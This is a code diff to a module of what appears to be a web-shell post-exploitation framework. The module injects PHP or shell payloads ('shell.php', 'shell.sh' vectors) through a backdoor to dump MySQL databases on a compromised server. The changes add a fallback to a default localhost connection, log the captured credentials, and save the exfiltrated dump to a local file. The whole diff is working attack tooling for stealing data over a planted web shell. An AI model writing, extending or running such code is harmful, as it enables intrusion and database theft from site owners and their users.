@@ -19,12 +19,10 @@ class Dump(Module):
 
     
     vectors = VectorList( [
-            Vector('shell.sh', 'mysqldump', "mysqldump -h %s -u %s --password=%s %s %s --single-transaction") ,
-            # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527
             Vector('shell.php', 'mysqlphpdump', """
 function dmp ($table)
 {
-    $result .= "-- -------- TABLE '$table' ----------\n";
+    $result .= "\n-- -------- TABLE '$table' ----------\n";
     $query = mysql_query("SELECT * FROM ".$table);
     $numrow = mysql_num_rows($query);
     $numfields = mysql_num_fields($query);
@@ -77,20 +75,30 @@ function dmp ($table)
     return $result . "\n\n";
 }
 ini_set('mysql.connect_timeout',1);
-mysql_connect("%s","%s","%s");
+$res=mysql_connect("%s", "%s", "%s");
 $db_name = "%s";
 $db_table_name = "%s";
 mysql_select_db($db_name);
 $tableQ = mysql_list_tables ($db_name);
 $i = 0;
-while ($i < mysql_num_rows ($tableQ))
+$num_rows = mysql_num_rows ($tableQ);
+if($num_rows) {
+
+if(!$res) {print("-- DEFAULT\n"); }
+
+while ($i < $num_rows)
 {
     $tb_names[$i] = mysql_tablename ($tableQ, $i);
     if(($db_table_name == $tb_names[$i]) || $db_table_name == "") {
         print(dmp($tb_names[$i]));
     }
     $i++;
-}""")
+}
+}
+"""),
+   Vector('shell.sh', 'mysqldump', "mysqldump -h %s -u %s --password=%s %s %s --single-transaction") ,
+    # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527
+
             ])
 
 
@@ -100,7 +108,8 @@ while ($i < mysql_num_rows ($tableQ))
             P(arg='pwd', help='SQL password', required=True, pos=2),
             P(arg='db', help='Database name', required=True, pos=3),
             P(arg='table', help='Table name to dump (any to dump entire database)', default='any', pos=4),
-            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=5))
+            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=5),
+            P(arg='lfile', help='Local dump path', default='sql.dump', pos=6))
 
 
     def __init__( self, modhandler , url, password):
@@ -111,7 +120,7 @@ while ($i < mysql_num_rows ($tableQ))
         
         
 
-    def run_module( self, mode, user, pwd , db, table, host ):
+    def run_module( self, mode, user, pwd , db, table, host, lpath ):
         
         if mode != 'mysql':
             raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
@@ -122,8 +131,22 @@ while ($i < mysql_num_rows ($tableQ))
         for vector in vectors:
             response = self.__execute_payload(vector, [mode, host, user, pwd, db, table])
             if response != None:
+                
+                try:
+                    lfile = open(lpath,'w')
+                except:
+                    raise ModuleException(self.name,  "Error opening dump file \'%s\'" % lpath)
+                
+                if response.startswith('-- DEFAULT'):
+                    self.mprint("[%s] Error connecting to '%s:%s@%s', check credentials\n[%s] Default connection 'user@localhost' available, saving dump in %s\n" % ( self.name, user, pwd, host, self.name, lpath))
+                else:
+                    self.mprint("[%s] Saving '%s:%s@%s' dump in '%s'\n" % (self.name, user, pwd, host, lpath))
+                    
                 self.params.set_and_check_parameters({'vector' : vector.name})
-                return response
+                
+                lfile.write(response)
+                lfile.close()
+                return
         
     def __execute_payload(self, vector, parameters):
         
@@ -149,7 +172,7 @@ while ($i < mysql_num_rows ($tableQ))
         if response:
             return response
         else:
-            self.mprint('[%s] Error dumping database, no response' % self.name)
+            self.mprint('[%s] Error dumping database. Access denied or wrong database name' % self.name)
             
     def __prepare_payload( self, vector, parameters):
 
